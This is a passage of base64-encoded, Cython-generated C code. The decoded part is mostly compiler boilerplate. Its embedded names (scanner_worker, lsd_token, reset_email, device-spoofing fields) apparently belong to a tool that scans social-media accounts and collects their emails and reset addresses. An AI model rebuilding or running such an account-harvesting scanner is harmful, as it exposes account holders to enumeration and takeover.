lLT5fX3B5eF9uX3VfcmVzdCwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0FfcV9RX3FfcV9hX1FfcV9hXzFfMV9BX2FfY2NkX0YsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTJdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDI2M307XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfSWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VpZH07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTNdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX2JfaXNvODg1OTFfQV9RYV9yXzZfcV9GX3FfVjFfcV8zZkFfcV8zZkFfcSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxM10pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHszLCAwLCAwLCAxOSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDI5MX07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dnLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfSWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1bGxfbmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm93cywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm93ZywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHAsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lzUHJhaXNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9iaW8sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lzX3ZlcmlmaWVkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9tZXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNldF9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZW1haWwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3NzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pbmxpbmVfa2V5Ym9hcmQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3BheWxvYWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2V9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE0XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90dF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfSW5mb0FjYywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0FfYXFfWnQxSmFfNHFfYV9hX0FfMlRfQV8yVF9RXzRxLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE0XSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDMsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAzNTh9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGYsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3N0YXJ0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbmR9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE1XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90dF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9pZCwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0Ffd2xfc182XzFHMSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNV0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsyLCAwLCAwLCAyMCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM2Mn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfd29ya2VyX2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VyX2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9tb2RlbF9udW1iZXIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2FuZHJvaWRfdmVyc2lvbiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZHBpXzIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc29sdXRpb24sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2JyYW5kLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9idWlsZF9zdWZmaXgsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJfYWdlbnRfMiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbHNkX3Rva2VuLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcl9pbmZvLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9sbG93ZXJfY291bnQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X21lZGlhX2NvdW50LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTZdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zY2FubmVyX3dvcmtlciwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0FfYXFfZF8xXzNhdlhRZTFfZkcxX1FfUWZIQVVfMUYsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTZdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDQxNH07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZn07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTddID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jcmVhdGVfZGFzaGJvYXJkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX2JfaXNvODg1OTFfQV9RYV9RX1FhX2xfODFBUV9RX1FhX3FfTF8xQVFfUSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxN10pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAxMCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDQyNH07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZXhlY3V0b3IsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1dHVyZV90b193b3JrZXIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3dvcmtlcl9pZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYWN0aXZlX3dvcmtlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1dHVyZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfd2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mdXR1cmV9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE4XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90dF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYWR2YW5jZWRfc2Nhbm5lciwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0FfRl8xX3FfSEFfcV9kX1NfMUFfMV8xX2FfUV9xX3EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMThdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDQ1OH07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTldID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ydW4sIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfYl9pc284ODU5MV9BX05fSVVfS3VBX0FRYV8yVjNqX0RfQSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxOV0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX1ZBUkFSR1N8Q09fVkFSS0VZV09SRFMpLCA0ODZ9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2FyZ3MsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2t3YXJnc307XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMjBdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ibG9ja2VkX2V4aXQsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfYl9pc284ODU5MV9mQVEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMjBdKSkgZ290byBiYWQ7XG4gIH1cbiAgUHlfREVDUkVGKHR1cGxlX2RlZHVwX21hcCk7XG4gIHJldHVybiAwO1xuICBiYWQ6XG4gIFB5X0RFQ1JFRih0dXBsZV9kZWR1cF9tYXApO1xuICByZXR1cm4gLTE7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKSB7XG4gIFxuICBpZiAobGlrZWx5KF9fUHl4X2luaXRfY29fdmFyaWFibGVzKCkgPT0gMCkpOyBlbHNlXG4gIFxuICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKGxpa2VseShfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KF9fcHl4X20pID09IDApKTsgZWxzZVxuICBcbiAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIHtcbiAgICAgIFB5T2JqZWN0ICp0eXBlc01vZHVsZT1OVUxMO1xuICAgICAgdHlwZXNNb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIik7XG4gICAgICBpZiAodHlwZXNNb2R1bGUpIHtcbiAgICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyh0eXBlc01vZHVsZSwgIk1ldGhvZFR5cGUiKTtcbiAgICAgICAgICBQeV9ERUNSRUYodHlwZXNNb2R1bGUpO1xuICAgICAgfVxuICB9IC8vIGVycm9yIGhhbmRsaW5nIGZvbGxvd3NcbiAgI2VuZGlmXG4gIFxuICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKGxpa2VseShfX3B5eF9DeUZ1bmN0aW9uX2luaXQoX19weXhfbSkgPT0gMCkpOyBlbHNlXG4gIFxuICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKGxpa2VseShfX3B5eF9HZW5lcmF0b3JfaW5pdChfX3B5eF9tKSA9PSAwKSk7IGVsc2VcbiAgXG4gIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIHJldHVybiAwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIHJldHVybiAtMTtcbn1cblxuXG5cblxuI2lmZGVmIF9NU0NfVkVSXG4jcHJhZ21hIHdhcm5pbmcoIHB1c2ggKVxuXG4jcHJhZ21hIHdhcm5pbmcoIGRpc2FibGUgOiA0MTI3IClcbiNlbmRpZlxuXG5cblxuXG5cblxuXG4jaWYgQ1lUSE9OX1JFRk5BTk5ZXG5zdGF0aWMgX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKl9fUHl4X1JlZk5hbm55SW1wb3J0QVBJKGNvbnN0IGNoYXIgKm1vZG5hbWUpIHtcbiAgICBQeU9iamVjdCAqbSA9IE5VTEwsICpwID0gTlVMTDtcbiAgICB2b2lkICpyID0gTlVMTDtcbiAgICBtID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKG1vZG5hbWUpO1xuICAgIGlmICghbSkgZ290byBlbmQ7XG4gICAgcCA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcobSwgIlJlZk5hbm55QVBJIik7XG4gICAgaWYgKCFwKSBnb3RvIGVuZDtcbiAgICByID0gUHlMb25nX0FzVm9pZFB0cihwKTtcbmVuZDpcbiAgICBQeV9YREVDUkVGKHApO1xuICAgIFB5X1hERUNSRUYobSk7XG4gICAgcmV0dXJuIChfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqKXI7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG5zdGF0aWMgaW50IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNUdXBsZShQeU9iamVjdCAqZXhjX3R5cGUsIFB5T2JqZWN0ICp0dXBsZSkge1xuICAgIFB5X3NzaXplX3QgaSwgbjtcbiAgICBuID0gUHlUdXBsZV9HRVRfU0laRSh0dXBsZSk7XG4gICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7XG4gICAgICAgIGlmIChleGNfdHlwZSA9PSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKSkgcmV0dXJuIDE7XG4gICAgfVxuICAgIGZvciAoaT0wOyBpPG47IGkrKykge1xuICAgICAgICBpZiAoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKSkpIHJldHVybiAxO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShQeVRocmVhZFN0YXRlKiB0c3RhdGUsIFB5T2JqZWN0KiBlcnIpIHtcbiAgICBpbnQgcmVzdWx0O1xuICAgIFB5T2JqZWN0ICpleGNfdHlwZTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE2XG4gICAgUHlPYmplY3QgKmN1cnJlbnRfZXhjZXB0aW9uID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjtcbiAgICBpZiAodW5saWtlbHkoIWN1cnJlbnRfZXhjZXB0aW9uKSkgcmV0dXJuIDA7XG4gICAgZXhjX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGN1cnJlbnRfZXhjZXB0aW9uKTtcbiAgICBpZiAoZXhjX3R5cGUgPT0gZXJyKSByZXR1cm4gMTtcbiNlbHNlXG4gICAgZXhjX3R5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlO1xuICAgIGlmIChleGNfdHlwZSA9PSBlcnIpIHJldHVybiAxO1xuICAgIGlmICh1bmxpa2VseSghZXhjX3R5cGUpKSByZXR1cm4gMDtcbiNlbmRpZlxuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X0lOQ1JFRihleGNfdHlwZSk7XG4gICAgI2VuZGlmXG4gICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfQ2hlY2soZXJyKSkpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKGV4Y190eXBlLCBlcnIpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgZXJyKTtcbiAgICB9XG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfREVDUkVGKGV4Y190eXBlKTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0Yikge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiAgICBQeU9iamVjdCAqdG1wX3ZhbHVlO1xuICAgIGFzc2VydCh0eXBlID09IE5VTEwgfHwgKHZhbHVlICE9IE5VTEwgJiYgdHlwZSA9PSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKSkpO1xuICAgIGlmICh2YWx1ZSkge1xuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIGlmICh1bmxpa2VseSgoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIHZhbHVlKS0+dHJhY2ViYWNrICE9IHRiKSlcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICBQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sodmFsdWUsIHRiKTtcbiAgICB9XG4gICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjtcbiAgICB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID0gdmFsdWU7XG4gICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYodHlwZSk7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjtcbiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7XG4gICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7XG4gICAgdG1wX3RiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3R5cGUgPSB0eXBlO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlID0gdmFsdWU7XG4gICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gdGI7XG4gICAgUHlfWERFQ1JFRih0bXBfdHlwZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYodG1wX3RiKTtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE2XG4gICAgUHlPYmplY3QqIGV4Y192YWx1ZTtcbiAgICBleGNfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uO1xuICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSAwO1xuICAgICp2YWx1ZSA9IGV4Y192YWx1ZTtcbiAgICAqdHlwZSA9IE5VTEw7XG4gICAgKnRiID0gTlVMTDtcbiAgICBpZiAoZXhjX3ZhbHVlKSB7XG4gICAgICAgICp0eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShleGNfdmFsdWUpO1xuICAgICAgICBQeV9JTkNSRUYoKnR5cGUpO1xuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgICp0YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgZXhjX3ZhbHVlKS0+dHJhY2ViYWNrO1xuICAgICAgICBQeV9YSU5DUkVGKCp0Yik7XG4gICAgICAgICNlbHNlXG4gICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4jZWxzZVxuICAgICp0eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTtcbiAgICAqdmFsdWUgPSB0c3RhdGUtPmN1cmV4Y192YWx1ZTtcbiAgICAqdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IDA7XG4gICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSAwO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IDA7XG4jZW5kaWZcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpIHtcbiAgICBQeVR5cGVPYmplY3QqIHRwID0gUHlfVFlQRShvYmopO1xuICAgIGlmIChsaWtlbHkodHAtPnRwX2dldGF0dHJvKSlcbiAgICAgICAgcmV0dXJuIHRwLT50cF9nZXRhdHRybyhvYmosIGF0dHJfbmFtZSk7XG4gICAgcmV0dXJuIFB5T2JqZWN0X0dldEF0dHIob2JqLCBhdHRyX25hbWUpO1xufVxuI2VuZGlmXG5cblxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwXG5zdGF0aWMgdm9pZCBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyX0NsZWFyQXR0cmlidXRlRXJyb3Iodm9pZCkge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgaWYgKGxpa2VseShfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkpXG4gICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICAodm9pZCkgUHlPYmplY3RfR2V0T3B0aW9uYWxBdHRyKG9iaiwgYXR0cl9uYW1lLCAmcmVzdWx0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xuI2Vsc2VcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgUHlUeXBlT2JqZWN0KiB0cCA9IFB5X1RZUEUob2JqKTtcbiAgICBpZiAobGlrZWx5KHRwLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHtcbiAgICAgICAgcmV0dXJuIF9QeU9iamVjdF9HZW5lcmljR2V0QXR0cldpdGhEaWN0KG9iaiwgYXR0cl9uYW1lLCBOVUxMLCAx